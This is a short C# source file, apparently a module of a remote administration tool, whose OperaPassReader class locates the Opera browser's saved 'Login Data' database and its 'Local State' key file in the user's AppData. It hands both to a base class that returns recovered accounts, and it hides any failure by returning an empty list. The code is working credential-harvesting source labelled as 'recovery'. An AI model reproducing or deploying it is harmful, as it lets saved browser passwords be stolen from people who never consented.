using Q3C273.Shared.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Ton618.Recovery.Browsers
{
    public class OperaPassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Opera";

        /// <inheritdoc />
        public override IEnumerable<RecoveredAccount> ReadAccounts()
        {
            try
            {
                var filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Login Data");
                var localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
